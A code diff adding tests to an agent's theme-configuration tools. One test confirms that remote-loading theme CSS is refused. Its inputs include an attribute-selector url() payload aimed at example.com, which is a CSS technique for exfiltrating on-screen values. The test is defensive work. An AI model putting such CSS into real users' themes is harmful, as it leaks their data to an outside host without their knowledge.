@@ -262,6 +262,32 @@ describe('the agent write policy', () => {
     expect(settings.getHostConfig().config).toEqual(before)
   })
 
+  test('an agent restyles Solus: read_theme shows the CSS the person has, and update_config sends new CSS to their client', async () => {
+    // The agent edits the person's CSS rather than replacing it blind, and the
+    // CSS follows the person through their client's sync (docs/theme-css.md).
+    const tools = await import('@solus/server/execution/agents/tools/config-tools')
+    personal = { themeMode: 'dark', themeCss: '.dark { --solus-accent: #7aa2f7; }' }
+    const read = JSON.parse((await runTool(tools.readThemeAgentTool, {}, context)).text) as { current: { themeMode: string; themeCss: string }; guide: string }
+    expect(read.current).toEqual({ themeMode: 'dark', themeCss: '.dark { --solus-accent: #7aa2f7; }' })
+    expect(read.guide).toContain('[data-slot="user-message"]')
+    expect(read.guide).toContain('--solus-accent')
+
+    const css = '.dark { --solus-accent: #9ece6a; }'
+    expect((await runTool(tools.updateConfigAgentTool, { personal: { themeCss: css } }, context)).ok).toBe(true)
+    expect(personal.themeCss).toBe(css)
+  })
+
+  test('theme CSS that loads a file is refused before it reaches the client', async () => {
+    // A url() on an attribute selector can send what is on screen to another host.
+    const tools = await import('@solus/server/execution/agents/tools/config-tools')
+    for (const css of ['@import "https://example.com/a.css";', '[value^="a"] { background: url(https://example.com/a) }', 'body { background: image-set("x.png" 1x) }']) {
+      const result = await runTool(tools.updateConfigAgentTool, { personal: { themeCss: css } }, context)
+      expect(result.ok).toBe(false)
+      expect(result.text).toStartWith('personal.themeCss')
+    }
+    expect(personalRequests.some((request) => request.settings?.themeCss !== undefined)).toBe(false)
+  })
+
   test('an agent may write instructions and the permission mode, with no approval step', async () => {
     // A product decision: agents configure every personal setting themselves.
     const tools = await import('@solus/server/execution/agents/tools/config-tools')
